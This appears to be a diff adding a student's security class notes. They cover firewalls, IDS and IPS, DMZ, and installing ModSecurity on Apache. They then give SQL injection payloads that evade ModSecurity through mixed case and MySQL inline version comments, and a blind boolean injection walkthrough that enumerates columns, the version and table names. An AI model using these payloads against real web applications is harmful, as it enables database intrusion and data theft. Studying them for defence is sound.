@@ -1,0 +1,195 @@
+						Session 12 
+						===========
+
+FIREWALLS
+==========
+It is an extra security layer, which helps me securing our web application and web site. It acts as the middle layer between the data transmission of user and the server.
+	Firewall act as the filter. It filters the unwanted packets and malicious packets. Firewall works on the basis of signature and permutation and combination of queries which are transmitted by the user.
+
+Knowledgebase : it acts like a database of the signatures and combinations for the firewall.
+
+TYPES OF FIREWALLS
+===================
+1. Softwares Based Firewalls : 
+These are the firewall which run over a system software which consist a rulesets of Inbound and Outbound Traffic coming from a Network. 
+Eg. Windows Firewalls , LInux Firewalls - IP Tables.
+
+2. Hardware Based Firewalls : A hardware based firewall is a peripheral which is having a system box with a processor and giving us a Configuration Panel and having more advanced features from a Software Based Firewalls.
+Eg. Juniper, Sophos, Endian etc. 
+
+
+IDS
+===
+IDS stands Intrusion DEtection System, it is a software or a hardware based program which detects every suspicious activity and create a log for it. It can also create the logs and send immediately to the Network Administrator so that they can find out that there is a Intruder in our network. 
+It can be determined in different types such as NIDS (Network IDS),  HIDS (Host IDS), WIDS(Wireless IDS) etc
+
+IPS
+===
+IPS stands for Intrusion Prevention System, An IPS is different from IDS as they prevents and blocks the user/source IP Address who is sending and generating the malicious traffic in a particular network. A IPS follows immediate action on the basis of rulesets for eg. blocking a IP Address of a source creating a Reverse Connection.
+
+EG. of IDS and IPS - SNORT etc.
+
+
+DMZ (Demilitralized Zone):
+
+
+In computer networks, a DMZ (demilitarized zone) is a physical or logical sub-network that separates an internal local area network (LAN) from other untrusted networks, usually the Internet. External-facing servers, resources and services are located in the DMZ so they are accessible from the Internet but the rest of the internal LAN remains unreachable. This provides an additional layer of security to the LAN as it restricts the ability of hackers to directly access internal servers and data via the Internet.
+
+
+
+							WAF --> Web Application Firewall :
+
+A web application firewall (or WAF) filters, monitors, and blocks HTTP traffic to and from a web application. 
+
+MOD Security : ModSecurity, sometimes called Modsec, is a popular Open-source Web application firewall (WAF).
+
+
+Installation of Mod Security
+============================
+Installing and configuring ModSecurity
+
+Step 1: open terminal and type
+        $ apt-get update
+        $ apt-get upgrade
+        $ apt-get install apache2
+
+Step 2: $ sudo apt-get install libapache2-modsecurity
+
+Step 3: Now we need to place a modsecurity.conf configuration file into the /etc/modsecurity
+        $ sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
+ now open 
+        $ sudo nano /etc/modsecurity/modsecurity.conf
+Find this line:
+        SecRuleEngine DetectionOnly
+
+and change it to:
+
+        SecRuleEngine On
+
+Step 4: now check the apache2 log directory:
+        $ ls /var/log/apache2
+
+You should see three files: access.log, error.log and other_vhosts_access.log.
+
+Now restart the apache2 service and check this directory again
+        $ sudo service apache2 reload
+        $ ls /var/log/apache2
+A new log called modsec_audit.log was created
+
+Step 5: now check the modsecurity-crs direcotry
+        $ ls /usr/share/modsecurity-crs/
+ the directories: activated_rules, base_rules, experimental_rules and optional_rules  
+
+Step 6: for activate all of the rules in the base_rules and optional_rules directories so execute the following commands in a terminal:
+        $ cd /usr/share/modsecurity-crs/base_rules
+        $ for f in * ; do sudo ln -s /usr/share/modsecurity-crs/base_rules/$f /usr/share/modsecurity-crs/activated_rules/$f ; done
+
+        $ cd ..
+        $ cd optional_rules
+        $ cd /usr/share/modsecurity-crs/optional_rules
+        $ for f in * ; do sudo ln -s /usr/share/modsecurity-crs/optional_rules/$f /usr/share/modsecurity-crs/activated_rules/$f ; done
+
+        $ cd ..
+        $ cd experimental_rules
+        $ cd /usr/share/modsecurity-crs/experimental_rules
+        $ for f in * ; do sudo ln -s /usr/share/modsecurity-crs/experimental_rules/$f /usr/share/modsecurity-crs/activated_rules/$f ; done
+
+
+Step 7: we need to tell apache where to find the activated rules. Open the /etc/apache2/mods-available/security2.conf file.
+        $ sudo nano /etc/apache2/mods-available/security2.conf
+
+        At the end of the file just before </IfModule> enter the following lines:
+        Include "/usr/share/modsecurity-crs/*.conf"
+        Include "/usr/share/modsecurity-crs/activated_rules/*.conf"
+        save it
+
+Step 8: We must enable the headers module, this allows ModSecurity to control and modify the HTTP headers for both requests and  responses.
+        $ sudo a2enmod headers
+        Now restart apache:
+        $ sudo service apache2 restart
+        
+
+cd /etc/apache2/sites-available
+ls ---> 000-default.conf
+sudo nano 000-default.conf
+edit
+	ProxyPass -->  Web application IP
+	ProxyPassReverse --> Web application IP
+save and exit
+sudo service apache2 restart
+
+Bypassing MOD_SECURITY
+======================
+
+union select 1,2--+
+	Block
+Mix Cases
+	UnIoN SeLeCt 1,2--+	
+Inline Executable Comments
+In these inline executable comments one can see that it shows up the problematic scenario of not showing up results so on that wwe simply add up the ersion no. in the comments but this will work only on the versions less that 6. And the representation of writing a version will be like suppose we have 5.00.00 version it will be written withour using (.). 	Now the representation will become 
+ /*!50000union*/
+50000
+	/*!UnIoN*/ /*!SeLeCt*/ 1,2--+	
+	/*!UnIoN*/ /*!SeLeCt*/ 1,table_name from /*!information_schema.tables*/--+
+
+BLIND SQL INJECTION
+===================
+	Blind SQL injection is a type of sql injection attack that ask the database true or false questions and determine the answer based on the application response. This attack is often used when the web application is configured to show generic error message, but has not mitigated the code that is vulnerable to SQLi. This type of sql injection is identical to normal sql injection, the only is the data retreived from the database.
+	1. Blind Boolean
+	2. Time Based SQL Injection
+
+http://newsletter.com/items.php?id=2
+------------------------------------
+select title,description from items where id=2
+----------------------------------------------
+
+http://newsletter.com/items.php?id=2 and 1=2
+
+select title,description from items where id=2 and 1=2
+
+Demo
+====
+	1
+	1' 
+	1' and 1=0 # ---> False
+	1' and 1=1 # ---> True
+	1' and 1=0 order by 1 # --> No Result ---> Generic error
+	1' and 1=1 order by 1 # --> Result --> normal result
+	1' and 1=0 order by 2 # --> No result
+	1' and 1=1 order by 2 # ---> Result
+	1' and 1=0 order by 3 # ---> No Result
+	1' and 1=1 order by 3 # ---> No Result ---> True ---> there are 2 number of columns
+	1' and 1=0 union select 1,2 #
+	1' and 1=1 union select 1,2 #
+	1' and 1=0 union select NULL,2 # --> nO dATA
+	1' and 1=1 union select null,2 #---> 	 Shows Data
+	1' and 1=0 union select null,substr(@@version,1,1)=5 #
+	1' and 1=0 union select null,substr(@@version,1,1)=4 #
+	1' and 1=0 union select null,substr(@@version,1,1)=3 #
+	1' and 1=0 union select null,substr(@@version,1,1)=2 #
+	1' and 1=0 union select null,substr(@@version,1,1)=1 #
+	1' and 1=0 union select null,substr(@@version,2,1)=1 #
+	1' and 1=0 union select null,substr(@@version,2,1)=2 #
+	1' and 1=0 union select null,substr(@@version,2,1)=3 #
+	1' and 1=0 union select null,substr(@@version,2,1)=0 #
+	1' and 1=0 union select null, table_name from information_schema.tables #
+
+
+
+/*! */
+
+
+
+
+
+
+
+https://pastebin.com/hqxmN9tU
+
+
+
+
+
+
+
+
